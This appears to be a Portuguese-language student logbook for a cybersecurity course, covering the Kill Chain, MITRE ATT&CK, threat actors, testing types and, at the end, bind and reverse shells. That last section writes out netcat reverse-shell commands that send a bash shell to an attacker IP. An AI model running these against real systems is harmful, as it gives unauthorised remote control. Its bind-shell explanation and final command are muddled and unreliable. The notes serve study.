## Sumário
* <a href="#Introdução">Introdução</a>;
* <a href="#Modulo 1 ">Modulo 1</a>;
  * <a href="# Cibersegurança vs Ciberdefesa "> Cibersegurança vs Ciberdefesa </a>;
     * <a href="# Cibersegurança "> Ciberseguraça </a>;
     * <a href="# Ciberdefesa"> Ciberdefesa</a>;
  * <a href="#Lockheed Matin and Mitre Frameworks">Lockheed Matin and Mitre Frameworks </a>;
      * <a href="#Lockheed Matrin"> Lockheed Matin</a>;
      * <a href="# Mitre Frameworks">  Mitre Frameworks</a>;
  * <a href="#Kali Walktrought "> Kali Walktrought </a>;
  * <a href="#Labtainers Walktrought ">Labtainers Walktrought</a>;
* <a href="#Modulo 2"> Modulo 2 </a>;
  * <a href="#Threat Actors ">Threat Actors</a>;
   * <a href="#Hats">Hats</a>;
   * <a href="#Actor Motivations">Actor Motivations</a>;
  * <a href="#Types of Testing ">Types of Testing</a>;
  * <a href="#Bind shells and Reverse Shells">Bind shells and Reverse Shells</a>;
    *  <a href="#Bind shells">Bind shells</a>;
    *  <a href="# Reverse Shells">Reverse Shells</a>;
  * <a href="#Tunneling Exploits thought SSH ">Tunneling Exploits thought SSH </a>;
  * <a href="#Metasploitable2 VM Walkthrough">Metasploitable2 VM Walkthrough </a>;
  * <a href="#Tools and Methodologies">Tools and Methodologies </a>;

## Introdução  
Esse logbook tem como objetivo servir como um registro pessoal das lições aprendidas durante as aulas.

## Modúlo 1

## Cibersegurança vs Ciberdefesa

A cibersegurança é sobre medidas preventivas para manter seu espaço digital seguro, enquanto ciberdefesa é a ação rápida para lidar com ameaças em andamento. Ambos trabalham juntos para garantir que sua experiência online seja segura e tranquila.
 
### Ciberseguraça 
A cibersegurança abrange um conjunto abrangente de práticas e técnicas essenciais para proteger os ativos digitais e as informações sensíveis de uma organização. Isso engloba desde a definição de políticas e estratégias de segurança até a implementação de medidas técnicas e operacionais para defender contra ameaças cibernéticas. 

Envolve também o desenvolvimento seguro de sistemas e aplicativos, a gestão contínua de riscos e vulnerabilidades, além do cumprimento de regulamentações e padrões de segurança.

Ou podemos dizer que:

Cibersegurança é como a proteção digital que usamos para manter nossos computadores, smartphones e informações seguras quando estamos online. É como um escudo virtual que nos protege contra pessoas mal-intencionadas que tentam invadir nossos dispositivos ou roubar nossos dados.

Para manter esse escudo forte, existem muitas práticas e técnicas que as empresas e os especialistas em segurança cibernética empregam. Eles criam políticas de segurança, desenvolvem sistemas à prova de invasões, monitoram atividades suspeitas e respondem rapidamente a qualquer ameaça que possa surgir.

***Compotentes de Cibersegurança***
 *  Information Security
 *  IT Security
 *  OT Security
 *  Offensive Security
   
### Ciberdefesa

 A defesa cibernética é caracterizada como um mecanismo de defesa de rede de computadores que engloba respostas a ações, proteção de infraestrutura crítica e garantia da informação para organizações, entidades governamentais e outras redes.

 O foco principal da defesa cibernética reside em prevenir, detectar e responder prontamente a ataques ou ameaças para garantir a integridade da infraestrutura e da informação.

 Podemos dizer que ela é como um guarda-costas para os computadores e redes que usamos todos os dias. É um conjunto de estratégias e ferramentas projetadas para proteger nossas informações, como senhas e dados pessoais, de pessoas mal-intencionadas na internet. Esses "guardiões" trabalham para prevenir, detectar e responder rapidamente a qualquer tentativa de ataque ou ameaça que possa comprometer a segurança de nossos computadores e redes.

 ## Lockheed Matin and Mitre Frameworks
 
O Lockheed Martin Cyber Kill Chain e o MITRE ATT&CK Framework são duas estruturas amplamente reconhecidas na área de cibersegurança. Ambos são usados para entender e analisar as etapas e táticas que os invasores cibernéticos usam durante um ataque.

###  Lockheed Matin 

O Lockheed Martin Cyber Kill Chain é uma estrutura que nos ajuda a entender como os cibercriminosos realizam ataques. É como uma lista de etapas que eles seguem para invadir sistemas de computadores. 

E essas etapas começa com o reconhecimento, onde os invasores coletam informações sobre seus alvos usando várias fontes, como sites e redes sociais. Em seguida, passam para a entrega, onde escolhem métodos para entrar nos sistemas das vítimas, como e-mails de phishing ou exploração de vulnerabilidades. Depois, ocorre a exploração, onde os invasores procuram maneiras de aproveitar vulnerabilidades e obter acesso total aos sistemas.

Após explorar vulnerabilidades, os invasores instalam programas maliciosos nos sistemas alvo para manter o acesso e configuram canais de comunicação secretos para controlar remotamente os sistemas comprometidos. Com esse controle, realizam ações maliciosas, como roubo de dados ou danos aos sistemas. Por fim, os invasores exfiltram os dados roubados do sistema para uso fraudulento ou venda no mercado negro. Essa sequência de etapas ajuda a entender como os invasores operam e permite o desenvolvimento de estratégias para proteger os sistemas contra esses ataques.

###  Mitre Frameworks

O MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) é um conjunto de informações organizado que ajuda a entender como os invasores cibernéticos planejam e executam seus ataques. Ele descreve as diferentes maneiras que os invasores usam para entrar em sistemas de computadores e redes, como se movem dentro desses sistemas e como retiram informações. É como um mapa que mostra os caminhos que os invasores podem seguir e as ferramentas que podem usar ao longo do caminho. Isso ajuda as empresas e organizações a se protegerem, entendendo melhor as ameaças e tomando medidas para evitar que seus sistemas sejam comprometidos.

## Kali Walktrought

O Kali Walkthrough é um método sistemático usado para guiar e documentar os passos seguidos durante um teste de penetração usando a distribuição Kali Linux. Este procedimento detalhado é essencial para manter um registro organizado das atividades realizadas durante o teste, incluindo a identificação de vulnerabilidades, exploração de sistemas e análise de resultados.

Durante o Kali Walkthrough, são registrados os comandos executados, ferramentas utilizadas, resultados obtidos e observações relevantes. Essa abordagem estruturada ajuda a garantir a consistência, precisão e rastreabilidade das ações realizadas durante o teste de penetração. Além disso, fornece um recurso valioso para revisão, análise e compartilhamento de informações entre os membros da equipe de segurança cibernética.

## Labtainers Walkthrough

O Labtainers Walkthrough é um método utilizado para conduzir e documentar atividades práticas em ambientes de laboratório virtual usando a plataforma Labtainers. Essa abordagem é fundamental para registrar as etapas seguidas durante a execução de exercícios, laboratórios ou simulações em segurança cibernética e redes.

Durante o Labtainers Walkthrough, são registrados detalhes como configurações de laboratório, comandos executados, resultados obtidos, observações importantes e quaisquer problemas encontrados durante o processo. Esse registro sistemático ajuda a acompanhar o progresso, identificar áreas de melhoria e revisar o trabalho realizado.

Além disso, o Labtainers Walkthrough fornece uma documentação valiosa para referência futura, permitindo que os usuários revisitem e compreendam os procedimentos realizados durante as atividades de laboratório. Isso promove a aprendizagem contínua e aprimora as habilidades práticas em segurança cibernética e redes.

## Modulo 2
### Threat Actors

***Cyberterrorists***: 

São indivíduos ou grupos que realizam ataques cibernéticos com o objetivo de causar danos sérios à infraestrutura, à economia ou à segurança de um país ou organização. Suas ações podem ser motivadas por razões políticas, ideológicas ou religiosas.

***Government-Sponsored/State-Sponsored Actors***: 

Esses atores são patrocinados ou apoiados por governos ou entidades estatais. Eles realizam atividades cibernéticas com objetivos políticos, militares, econômicos ou de inteligência, visando obter vantagens estratégicas ou comprometer os interesses de outros países.

***Organized Crime/Cybercriminals***: 

Grupos organizados de criminosos que realizam atividades cibernéticas ilegais, como fraudes financeiras, roubo de dados, extorsão e ataques a sistemas de pagamento online. Seu principal objetivo é obter lucro financeiro por meio de atividades criminosas na Internet.

***Hacktivists***: 

São indivíduos ou grupos que realizam ataques cibernéticos com motivações políticas ou sociais. Eles usam técnicas de hacking para protestar contra governos, empresas ou instituições que consideram injustas ou antiéticas. Suas ações visam geralmente chamar a atenção para questões sociais ou políticas.

***Insiders***: 

São indivíduos que têm acesso legítimo a sistemas ou informações confidenciais de uma organização, mas que usam esse acesso de forma indevida para causar danos, realizar espionagem, roubar dados ou cometer fraudes. Os insiders podem ser funcionários, contratados ou ex-funcionários da organização.

***Script Kiddies***: 

São indivíduos com conhecimento técnico básico de hacking que usam ferramentas e scripts prontos disponíveis na Internet para realizar ataques cibernéticos simples. Geralmente, eles não têm habilidades avançadas em programação ou segurança cibernética e realizam ataques por diversão, desafio ou para se exibirem perante a comunidade hacker.

***Internal User Errors***: 

Se refere a erros cometidos por usuários internos de uma organização que podem resultar em violações de segurança ou falhas operacionais. Esses erros podem ocorrer devido à falta de treinamento adequado em segurança cibernética, descuido, negligência ou falta de compreensão das políticas e procedimentos de segurança da organização.

### Hats
Exitem seis tipos de Hackers que são:

***Hackers Éticos (White Hats)***:

São hackers que utilizam suas habilidades de hacking de forma ética e legal. Eles geralmente trabalham para empresas, organizações ou agências governamentais para identificar vulnerabilidades em sistemas e redes, a fim de fortalecer a segurança e proteger contra ataques cibernéticos.

***Hackers Maliciosos (Black Hats)***: 

São hackers que realizam atividades de hacking com intenções maliciosas e ilegais. Eles buscam explorar vulnerabilidades em sistemas e redes para roubar informações, danificar sistemas, extorquir dinheiro ou causar outros danos.

***Hackers de Chapéu Cinza (Gray Hats)***:

São hackers que podem realizar atividades tanto éticas quanto maliciosas, dependendo do contexto e das circunstâncias. Eles podem descobrir vulnerabilidades em sistemas sem permissão, mas podem ou não usar essas informações de forma maliciosa.

***Hackers de Chapéu Azul (Blue Hats)***:

Este termo é menos comum, mas às vezes é usado para descrever hackers que são contratados por empresas para testar a segurança de seus próprios sistemas, geralmente em resposta a incidentes de segurança ou preocupações com ameaças internas.

***Hackers de Chapéu Verde (Green Hats)***: 

Este termo também é menos comum, mas às vezes é usado para descrever hackers iniciantes ou inexperientes que estão aprendendo e desenvolvendo suas habilidades de hacking.

***Hackers de Chapéu Vermelho (red Hats)***:


São hackers que realizam atividades de Hacking com intenções ambíguas ou estaão dispostas a ultrapassar limites éticos em suas atividades de hacking.

### Actor Motivations

As motivações dos atores no contexto da cibersegurança podem ser variadas e complexas, influenciadas por uma série de fatores.  

***Agendas Políticas, Econômicas, Técnicas e Militares***: 

Alguns atores, como governos ou grupos militares, podem ter motivações políticas, econômicas, técnicas ou militares para conduzir atividades cibernéticas. Isso pode incluir espionagem industrial, coleta de informações estratégicas ou sabotagem de sistemas adversários.

***Lucro/Ganho Financeiro***: 

Muitos ataques cibernéticos são motivados pelo desejo de lucro financeiro. Isso pode incluir roubo de dados pessoais ou financeiros para extorsão, venda no mercado negro ou acesso a informações confidenciais para obtenção de vantagem financeira.

***Notoriedade***: 

Alguns indivíduos ou grupos podem realizar ataques cibernéticos em busca de notoriedade ou reconhecimento. Isso pode incluir hackers que buscam provar suas habilidades, ganhar fama dentro da comunidade hacker ou chamar a atenção para questões específicas.

***Vingança***: 

Motivações de vingança também podem impulsionar ataques cibernéticos. Isso pode ocorrer quando um indivíduo ou grupo se sente prejudicado por uma organização ou entidade e busca retaliar através de atividades cibernéticas, como vazamento de dados ou interrupção de serviços.

***Sobreposição de Motivações***: 

Muitas vezes, as motivações dos atores podem se sobrepor ou ser uma combinação de vários fatores. Por exemplo, um grupo criminoso pode visar uma organização por motivos financeiros, mas também pode ter motivações políticas ou pessoais subjacentes.

## Types of Testing

Os testes de segurança de software são essenciais para garantir a robustez e confiabilidade dos sistemas em um ambiente digital cada vez mais complexo. Entre os tipos de testes mais comuns, destacam-se o Black Box, Gray Box e White Box, cada um com suas características distintas e objetivos específicos.

***Gray Box (Caixa Cinza)***:

Simula as interações do usuário com o sistema sem que os testadores tenham conhecimento interno da estrutura ou implementação do software. Esse método é valioso para identificar comportamentos inesperados e problemas de usabilidade, segurança e funcionalidade, refletindo as experiências reais dos usuários finais.

***Gray Box (Caixa Cinza)***:

Combina elementos dos testes de Caixa Preta e Caixa Branca. Nele, os testadores possuem um conhecimento parcial da estrutura interna do sistema, como diagramas de arquitetura ou detalhes de API, permitindo uma abordagem direcionada para explorar áreas específicas do software em busca de vulnerabilidades ou problemas.

***White Box (Caixa Branca)***:

oferece uma visão detalhada e completa da estrutura interna, design e implementação do sistema. Com acesso total ao código-fonte e arquitetura, os testadores podem identificar vulnerabilidades de segurança, otimizar o desempenho do código e garantir a conformidade com as melhores práticas de desenvolvimento de software. Esses tipos de teste são complementares e contribuem para uma avaliação abrangente da qualidade e segurança do software.

## Bind shells and Reverse Shells

O bind shell aguarda por conexões de entrada em uma porta específica, o reverse shell inicia uma conexão de saída de um sistema comprometido para um sistema controlado pelo invasor. Ambos são usados para fins de exploração e controle remoto em cenários de segurança e hacking.

### Reverse Shells
Reverse shells são uma técnica poderosa no arsenal de um invasor cibernético, permitindo o controle remoto de sistemas comprometidos. Nesse cenário, o invasor estabelece uma conexão de saída do sistema alvo para um servidor controlado pelo invasor. Uma vez que a conexão é estabelecida, o invasor pode enviar comandos para executar atividades maliciosas, como coletar dados, instalar malware ou até mesmo assumir o controle total do sistema comprometido.

Os comandos para criar um reverse shell variam dependendo do sistema operacional do alvo e do tipo de shell disponível. Por exemplo, em sistemas Unix-like, como Linux, o comando nc (netcat) é frequentemente utilizado para criar uma conexão de rede. No sistema alvo, o invasor pode usar o seguinte comando para iniciar o reverse shell e se conectar ao servidor remoto:

 ```shell
nc -e /bin/bash 10.1.2.34 80
```
Isso instrui o sistema alvo a abrir uma conexão com o endereço IP e porta especificados e executar um shell bash interativo. No lado do servidor, o invasor precisa estar ouvindo na porta especificada para receber a conexão reversa. O comando para isso seria:

 ```shell
nc -lvp 80
 ```
### Bind shell

Bind shells são outra técnica de invasão utilizada para estabelecer uma conexão de entrada em um sistema comprometido. Ao contrário dos reverse shells, onde o sistema alvo inicia a conexão de saída, no caso dos bind shells, o invasor inicia a conexão de entrada, aguardando que o sistema comprometido se conecte a ele.

Para criar um bind shell, o invasor configura um servidor para ouvir em uma porta específica e aguardar por conexões de entrada. Quando o sistema comprometido se conecta a essa porta, o invasor ganha acesso ao shell do sistema comprometido.

Naesse caso o comando seria a contrario ao de revese shell

```shell
nc  10.1.2.34 80
```

 ```shell
nc -lvp 10.1.2.34 80 -e /bin/bash
```
 



